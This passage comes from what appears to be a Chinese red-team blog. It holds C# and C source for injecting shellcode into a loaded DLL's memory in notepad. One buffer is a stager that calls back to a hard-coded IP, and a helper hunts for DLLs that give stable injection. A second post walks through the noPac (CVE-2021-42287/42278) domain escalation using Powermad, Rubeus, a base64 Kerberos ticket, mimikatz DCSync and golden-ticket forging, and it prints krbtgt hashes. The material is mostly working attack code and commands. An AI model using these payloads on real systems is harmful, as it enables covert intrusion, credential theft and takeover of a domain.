flNewProtect, out uint lpflOldProtect);        static void Main(string[] args)        {            int pid = Process.GetProcessesByName(&quot;notepad&quot;)[0].Id;byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };            Process processObj = Process.GetProcessById(pid);            foreach (ProcessModule module in processObj.Modules)            {                if (module.FileName.ToLower().Contains(&quot;gdi32full.dll&quot;))                {                    IntPtr addr = module.BaseAddress + 4096;                    Console.WriteLine(&quot;DLL BaseAddress:&quot;+addr);                    IntPtr outSize;                    uint oldProtect;                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);                    WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);                    IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);                    break;                }            }        }    }}</code></pre><p>C<br>示例代码:</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;unsigned char buf[] =  &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x41\x55\x53\x74\x00\x50\x3b\xee\xb2\x1e\xaf\x7b\x8f\xea\x2c\xc7\x03\x8a\xe7\x01\x52\x2d\x36\x42\x10\xdd\x4f\xd5\x10\x29\x0a\x34\x71\x55\x7a\x57\x16\x7b\x4e\xf0\x72\x78\xf7\x03\x64\xcd\x76\x26\x3d\x72\x2c\x3b\x61\x37\x22\xba\x56\xd9\x08\xa9\xf1\x4b\x07\xea\xf3\xd3\x37\xc7\x2e\x72\x78\x95\xa6\x04\x84\xd9\xf2\xa7\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4e\x50\x30\x38\x3b\x20\x4d\x41\x41\x55\x3b\x20\x4e\x50\x30\x38\x29\x0d\x0a\x00\x1e\x20\xa6\xba\x38\x5d\xf2\x48\xf5\x8a\xd0\xe1\x67\x11\x2c\x89\x1e\x13\x84\xfd\x3b\x1b\x2a\x76\xcc\xe3\x06\x10\xdb\xcb\x91\x3a\xbe\x47\xce\x62\xb6\x30\x67\x3a\x1a\x4d\xcb\x60\x6b\x61\x47\x54\x5f\x23\x37\x02\xda\xd6\x4c\x64\xb5\x28\x25\xc9\x15\x17\x78\x86\x24\x71\xdb\xf0\x39\x02\xdf\xcc\x96\xd6\x0a\x28\xb0\xe8\xea\x5c\xa2\x21\xe4\xb9\x01\x98\xf7\x53\x52\x2c\xe3\x6f\x0e\x94\xf9\x6b\x81\x19\x67\xd4\x1a\x0d\xa8\x9b\xe5\x08\x1c\x3d\x14\xe1\x78\x91\xa6\xa4\x4b\x7b\x55\x4e\x8e\x44\xb6\x2c\xe2\xce\x6f\x23\x66\x09\x1b\x78\xb5\xe0\xec\x35\x28\xd0\x27\x6c\xde\xf1\xd3\xb5\xbd\xb3\xe8\x23\x7e\x0f\x69\xa2\x57\x57\x7d\x8c\x2f\xb3\x32\x45\x84\x2a\x6a\x2d\xde\xa0\xdd\xc0\x8a\x78\x36\x20\xbb\xa5\x35\xc4\x19\x2a\x03\x66\x25\xc7\xc0\xdd\xc8\x53\x37\x97\x6d\xb4\x8a\x30\xba\xad\xfe\x09\xe6\xbf\xae\x80\x7c\xdb\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x30\x2e\x31\x30\x30\x2e\x35\x2e\x37\x33\x00\x00\x08\xc3\x27&quot;;int PrintModules(HANDLE hProcess, DWORD processID){        printf(&quot;inject PID:%d\n&quot;,processID);        CHAR targetdll[] = &quot;uxtheme.dll&quot;;        CHAR dllname[1024] = { 0 };        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);        //      printf(&quot;%s\n&quot;, dllname);               if (strcmp(dllname, targetdll) == 0) {                       printf(&quot;find DLL:%s\n&quot;,targetdll);                       BYTE *Address = moduleEntry.modBaseAddr + 4096;                       printf(&quot;DLL Address:0x%x\n&quot;,Address);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                       WriteProcessMemory(hProcess, Address, buf, sizeof(buf), NULL);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                       CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                       printf(&quot;[+] inject shellcode sucess\n&quot;);               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;}int main(){        char targetname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        bool ct=CreateProcessA(targetname, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,  NULL, NULL, &amp;si, &amp;pi);        if (ct == false) {               printf(&quot;CreateProcess Fuck Error Code:%d\n&quot;,GetLastError());               exit(0);        }        Sleep(2000);        PrintModules(pi.hProcess,pi.dwProcessId);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YoFKg.png" alt=""></p><p>uxtheme.dll和msvcp_win.dll win10基本每个进程都加载了<br><img src="https://s4.ax1x.com/2022/01/16/7YoYI1.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YoUG6.png" alt=""></p><p>插打印机和Defender都行<br><img src="https://s4.ax1x.com/2022/01/16/7Yo2JP.png" alt=""></p><p>寻找稳定DLL（适用于win10）</p><pre><code class="c">// demoinject.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;winnt.h&gt;#include &lt;map&gt;#include &lt;iostream&gt;using namespace std;map &lt;string, int&gt; dlllist;map&lt;string, int&gt;::iterator iter;unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;char taskname[] = &quot;Calculator.exe&quot;;#define ErrorPrint(text,code){printf(&quot;Error:%s ErrorCode:%d\n&quot;,text,code);}int IsExistProcess(CONST CHAR* szProcessName){        PROCESSENTRY32 processEntry32;        char pname[1024] = { 0 };        HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (((int)toolHelp32Snapshot) != -1)        {               processEntry32.dwSize = sizeof(processEntry32);               if (Process32First(toolHelp32Snapshot, &amp;processEntry32))               {                       do                       {                              sprintf(pname, &quot;%ws&quot;, processEntry32.szExeFile);                              if (strcmp(szProcessName, pname) == 0)                              {                                      return processEntry32.th32ProcessID;                              }                       } while (Process32Next(toolHelp32Snapshot, &amp;processEntry32));               }               CloseHandle(toolHelp32Snapshot);        }        return FALSE;}int PrintModules(HANDLE hProcess,DWORD processID){        int id = 0;        CHAR currnetname[1024] = {0};        CHAR dllname[1024] = {0};        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);               if (id == 0) {                       sprintf(currnetname, &quot;%s&quot;, dllname);               }               id += 1;               if (strcmp(dllname, currnetname) != 0) {                       if (dlllist.find(dllname) == dlllist.end()) {                              //             printf(&quot;%s 0x%x\n&quot;,dllname,  moduleEntry.hModule);                              BYTE *Address = moduleEntry.modBaseAddr + 4096;                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                              WriteProcessMemory(hProcess, Address, buf, sizeof(buf),  NULL);                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                              CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                              MEMORY_BASIC_INFORMATION baseinfo;                              VirtualQueryEx(hProcess, Address, &amp;baseinfo,  sizeof(baseinfo));                              Sleep(5000);                              int currentpid = IsExistProcess(currnetname);                              //printf(&quot;the pid:%d %d\n&quot;, processID, currentpid);                              if (dlllist.find(dllname) == dlllist.end()) {                                      int kpid = IsExistProcess(taskname);                                      if (kpid) {                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  true));                                             printf(&quot;found DLL run shellcode ok:%s,but dll  is GG?\n&quot;, dllname);                                             HANDLE  kHprocess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, kpid);                                             TerminateProcess(kHprocess, 0);                                             Sleep(2000);                                             //return TRUE;                                             if (currentpid == processID) {                                                     printf(&quot;Found valid candidate:%s,  region size available on the .text section: 0x%x\n&quot;, dllname, baseinfo.RegionSize);                                                     return TRUE;                                             }                                             else {                                                     printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                                     dlllist.insert(pair &lt;string, int  &gt;(dllname, false));                                                     return FALSE;                                             }                                      }else {                                             printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  false));                                             return FALSE;                                      }                              }                       }               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;        /*        HANDLE hProcess;        DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        CHAR rmoduleName[MAX_PATH] = {};        unsigned int i;        printf(&quot;Process ID: %u\n&quot;, processID);        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,  processID);        if (NULL == hProcess) {               ErrorPrint(&quot;Rows:20 OpenProcess&quot;, GetLastError());        }        printf(&quot;\nOpenProcess:0x%x\n&quot;,hProcess);        bool MeiJu=EnumProcessModules(hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        printf(&quot;\nModuleCount:%d\n&quot;,(hmodulesizeneeded / sizeof(HMODULE)));        for (int calc = 0;calc &lt; (hmodulesizeneeded / sizeof(HMODULE));calc++) {               rmodule = hmodules[calc];               GetModuleFileNameExA(hProcess, rmodule, rmoduleName, sizeof(rmoduleName));  //获取模块名称               HMODULE  BaseAddress = GetModuleHandleA((LPCSTR)rmoduleName)+4096; //DLL加载起始地址               if (BaseAddress == NULL) {                       ErrorPrint(&quot;Rows:32 GetModuleBaseNameA&quot;,GetLastError());               }               printf(&quot;%s BaseAddress:0x%x\n&quot;, rmoduleName, BaseAddress);        }        CloseHandle(hProcess);        return 0;        */}int main(){        bool Ctprocess;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        si.cb = sizeof(si);        char processname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        int modulecount;        Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);        Sleep(2000);        bool MeiJu = EnumProcessModules(pi.hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        modulecount = hmodulesizeneeded / sizeof(HMODULE);        printf(&quot;module count:%d\n&quot;, modulecount);        TerminateProcess(pi.hProcess, 0);        Sleep(2000);        for (int calc = 0;calc &lt; modulecount;calc++) {        //      printf(&quot;frequency:%d\n&quot;,calc);               si = { 0 };               pi = { 0 };               Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);               if (Ctprocess != true) {                       ErrorPrint(&quot;Rows:14 CreateProcessA&quot;, GetLastError());               }               int Ctprocesspid = pi.dwProcessId;               Sleep(2000);               int kt = PrintModules(pi.hProcess, Ctprocesspid);               if (kt == 1) {                       break;               }        }        /*        if (TerminateProcess(pi.hProcess,0) != true) {               ErrorPrint(&quot;Rows:53 TerminateProcess&quot;,GetLastError());        }        printf(&quot;Kill Process\n&quot;);        */        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7Yo5LQ.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2021-42287/CVE-2021-42278 域内翻身做主人</title>
      <link href="/posts/f591678b.html"/>
      <url>/posts/f591678b.html</url>
      <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理：<br>创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 再改回  sAMAccountName  ==  xxx 接着导入票据到本地<br>参考链接:<br><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" target="_blank" rel="noopener">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>yayi.local - windows server 2012(DC) HostName:WIN-5CHMN9C4UES<br>域内机器:win7<br>普通用户:jk Hxc123456</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>检测能否利用：<br>默认情况下，它是10，但可以更改，高于0 的任何内容都可以。</p><pre><code>Get-DomainObject | findstr ms-ds-machine</code></pre><p><img src="https://static.aichat.net/chat/202112/e5f12adc-6349-4cc0-a7f9-fb0cbc3b1fb6.png" alt=""></p><p>最后，我们需要检查默认情况下授予经过身份验证的用户的SeMachineAccountPrivilege</p><pre><code>邪法:whoami /user #取出来的ID第4位进行-10  SID:S-1-5-21-2799505025-1944254007-2887416074-500ConvertFrom-SID S-1-5-11</code></pre><p><img src="https://static.aichat.net/chat/202112/3868861c-2415-4341-a30b-a72dad829516.png" alt=""></p><p>手动利用:</p><ul><li>Powermad</li><li>Rubeus</li></ul><pre><code>#创建机器用户$password = ConvertTo-SecureString &#39;ComputerPassword&#39; -AsPlainText -ForceNew-MachineAccount -MachineAccount &quot;Eva&quot; -Password $($password) -Domain &quot;yayi.local&quot; -DomainController &quot;WIN-5CHMN9C4UES.YAYI.local&quot; -Verbose#清除SPN信息Set-DomainObject &quot;CN=Eva,CN=Computers,DC=yayi,DC=local&quot; -Clear &#39;serviceprincipalname&#39; -Verbose#重命名新建机器名为DC机器名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;WIN-5CHMN9C4UES&quot; -Attribute samaccountname -Verbose#获取TGTRubeus.exe asktgt /user:&quot;WIN-5CHMN9C4UES&quot; /password:&quot;ComputerPassword&quot; /domain:&quot;yayi.local&quot; /dc:&quot;WIN-5CHMN9C4UES.yayi.local&quot; /nowrap#改回原来的计算机名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;Eva&quot; -Attribute samaccountname -Verbose#Request S4U2self（获取票据）Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-5CHMN9C4UES.yayi.local /self /altservice:LDAP/WIN-5CHMN9C4UES.yayi.local /ptt /ticket:doIFJDCCBSCgAwIBBaEDAgEWooIEODCCBDRhggQwMIIELKADAgEFoQwbCllBWUkuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnlheWkubG9jYWyjggP0MIID8KADAgESoQMCAQKiggPiBIID3o63EAl/yUgDHQmpBMWzqmvewt4GpUMUik4+5+s6gv16FRxloS4LplB1VwDs3iqATa4M5+Toko9kp5jHX9M0vGRekAlWb9VS+N97mEySMMQxAGIFhwV2xI4UAiZxiNLa6W7jGW9M5/z5StTXTcH7WVNOgA3NIxbGO8UWu+Ezk6wbcLKaA/Cm5hh7T2B2i8BrZzbD9uTSGXnJZRRv+HTpiv9+mq8FFPjO99qiu3VvK0XJYW3lKFvKLUVFwQidsUzvI2xD1jbtG6WADp9kbYoi5Tbj6PsWTXoU/rtaaZmIMdAfQgXrTIZob99HdwoKGS0ICNqhy1TGLRIWOgofopOhHlf99wbtVVneVytACl18O0QXnLP+BPePaSfJTXBdcdcQVBgZM1M7z/bQFqlNyCTDS2NQwgak0iDSHv/c0tstbxCqqEA1EQ8X28N1ENx0zgvPA4rOUNaQlBpZv9SSPQEkb0Ca13yHo9INdkZ4637YzGXVYuAXT2/wH2BQ7AVOQvetwlsY7CNJ2p5FcgYEYAwkmqurF/1DTMKJsRkWhstBWqvSXbHRsk0bxrC6uR7qX45rFweg7Q9FLI4t7Iv+pMFJjDUxJXRETaXq7ASHFpWULtmMB2LqTPc+igqUstiZOIAHTYN3xuShCyd1Hq17ISHl3iQOLK1BUhdJVgveaG+RguTvgGQ9Z6IyzqbORrnO6aA9JINoqhvgxTmeBfP7JmY5Ll8xHRMxMsEz+fD66RGAg6HVW4cwAbQLZePxuOBo/oclpsh8HPLuLEi7EKCgerSu/ANkIo2jzk9+RPl4+wABXriaRzn7sl+MRTV0r30jCXe3hwyii9QWw4MSzsRpR7zF2oD2n9yDS7wMjAj8/4YUwySnqyaerVsfqreHEN3CgIf+Fp4ZL8Dm8w1bMQ4msfJUm6+s51E8W7FzOOLXA18SD6Qb9xZOFqor+JapyeqCfJj20ShCGlxBA73srP5AkNbI8OduTP52GcvVYmNLT1jJI7LLi0gE4tVjE336H1KHkSukvfK1r2r3E1thiafWjQO1CMn1g8o0HwN3jW6LwdRGuhz2m+ocoq5KE3TxdYxI1vjFqlCKns9FkMWXslw5SytOqYtEicBUPNa17J3d3QadF7l7VYJWtEw6xAeB9F29WTaRaJCL8s7ghh06K27FwxLheIUukdwgOsMpJttkiJtUI+0u97gzQlIkSd2jb8tGdDnpRITi2LTwg1vvpmSvaGMQdZ+Oash27JHktjQwMHArrMM1mjtI1cQUgOdaRZGXpbdh7ThTdJwopaJQYdNsCIJ9poJNOhLXw+IM8m9RyDdxeKOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEELSllXk3Qm2tX3lpkSuPLWShDBsKWUFZSS5MT0NBTKIcMBqgAwIBAaETMBEbD1dJTi01Q0hNTjlDNFVFU6MHAwUAQOEAAKURGA8yMDIxMTIxMjIwNDE0MVqmERgPMjAyMTEyMTMwNjQxNDFapxEYDzIwMjExMjE5MjA0MTQxWqgMGwpZQVlJLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwp5YXlpLmxvY2Fs#DCSync (DCSync krbtgt hash伪造黄金票据等选择)lsadump::dcsync /user:yayi\krbtgt</code></pre><p><img src="https://static.aichat.net/chat/202112/73d0b4c5-3853-413a-9afe-63796bfb270a.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/c9af7c4c-52ef-420c-9a0e-9a5df398433c.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/45b40aad-892e-408f-8390-a5f99aec132f.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/7c05acaa-c3a9-4655-896d-dd47e4d1b8de.png" alt=""></p><p>票据检查:<br><img src="https://static.aichat.net/chat/202112/7c696639-6049-4a03-8db5-23fae9abaa96.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e5385b26-cb22-439a-9bc3-7a5269071b64.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/84071697-f640-4aee-afbe-e4f4e5933f23.png" alt=""></p><p>nopac:<br><a href="https://github.com/cube0x0/noPac" target="_blank" rel="noopener">https://github.com/cube0x0/noPac</a></p><pre><code>noPac.exe -dc WIN-5CHMN9C4UES.YAYI.local -mAccount evilpc -mPassword 123.com /service ldap /pttMimikatz &quot;lsadump::dcsync /user:yayi\krbtgt&quot;92b27a8d7877a2e27cf095e9c136b3c390e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36mimikatz &quot;kerberos::golden /domain:yayi.local /sid:S-1-5-21-2799505025-1944254007-2887416074 /aes256:90e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36 /user:sb /ptt&quot; exit</code></pre><p><img src="https://static.aichat.net/chat/202112/c05157b5-da40-47ad-8a5c-334e837c708e.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/ec8e38af-49e8-4c8a-9197-e3e01fb14dfa.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/612200c3-1100-4c1a-8adf-940e01b3b555.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/2cfb451d-7577-4f8d-af68-4d7ed287873b.png" alt=""></p><p>impacket复现，没成功</p><pre><code>python3 